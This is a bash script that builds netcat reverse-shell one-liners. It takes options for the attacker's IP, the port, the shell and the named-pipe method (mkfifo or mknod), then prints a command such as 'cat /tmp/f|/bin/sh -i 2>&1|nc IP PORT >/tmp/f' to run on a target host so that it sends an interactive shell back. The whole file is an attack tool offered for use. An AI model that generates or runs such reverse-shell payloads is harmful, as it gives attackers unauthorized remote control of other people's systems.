#!/bin/bash

mode="1"
ip="127.0.0.1"
shell="sh"
port="1337"
pipename="f"
creationmode="fifo"
command="rm /tmp/loe;"

if [ "${1}" == "-h" ] ;

then
	echo "Help page:"
	echo "OPTIONS"
	echo "-i : The ip address of the machine that the remote host will connect to. Default: 127.0.0.1 ."
	echo "-p : The port used. Default: 1337."
	echo "-s : The shell used. Default: sh."
	echo "-m : The data flow. Default: 1."
	echo "		1: pipe --> shell --> netcat --> pipe"
	echo "		2: pipe --> netcat --> shell --> pipe"
	echo "-c : The command used to create the pipe. Default: fifo."
	echo "		nod: mknod PIPENAME p"
	echo "		fifo: mkfifo PIPENAME"
	echo "-n : The name of the pipe that will be created on the remote host. Default: f."
	echo "-h : Display this help page."
	echo "-----"
	exit 0;
fi


while getopts m:i:p:s:n:c: opt
do
	case $opt in
		m) case "$OPTARG" in
			1) mode="1";;
			2) mode="2";;
			*) echo "Invalid mode."; exit 1;;
		esac;;
		i) ip="$OPTARG";;
		p) port="$OPTARG";;
		s) shell="$OPTARG";;
		n) pipename="$OPTARG";;
		c) case "$OPTARG" in
			nod) creationmode="$OPTARG";;
			fifo) creationmode="$OPTARG";;
			*) echo "Invalid pipe creation mode."; exit 1;;
		esac;;
		
	esac
done


if [ "$creationmode" == "fifo" ];
then
	command="${command}mkfifo /tmp/${pipename};"
elif [ "$creationmode" == "nod" ];
then
	command="${command}mknod /tmp/${pipename} p;"
else
	echo "Weird error."; exit 1;
fi

if [ "$mode" == "1" ];
then
	command="${command} cat /tmp/${pipename}|/bin/${shell} -i 2>&1|nc ${ip} ${port} >/tmp/$pipename"
elif [ "$mode" == "2" ];
then
	command="${command}nc ${ip} ${port} < /tmp/${pipename}|/bin/${shell} -i > /tmp/${pipename}"
else
	echo "Weird error."; exit 1;
fi

echo "Using mode: $mode"
echo "Using ip: $ip"
if [ "$ip" == "127.0.0.1" ];
then
	echo "--- That's the default ip. It will route the netcat connection back to the remote host. You may have forgotten to change it."
fi
echo "Using shell: $shell"
echo "Using port: $port"
if [ "$port" == "1337" ];
then
	echo "--- That's the default port. Its pretty popular. You may have forgotten to change it."
fi
echo "Using pipename: /tmp/$pipename"
if [ "$pipename" == "f" ];
then
	echo "--- That's the default pipename. A lot of people use it. Try and avoid overlap. You may have forgotten to change it."
fi
echo "Using creation mode: $creationmode"

echo ""
echo "#### Your shell ####"
echo "$command"
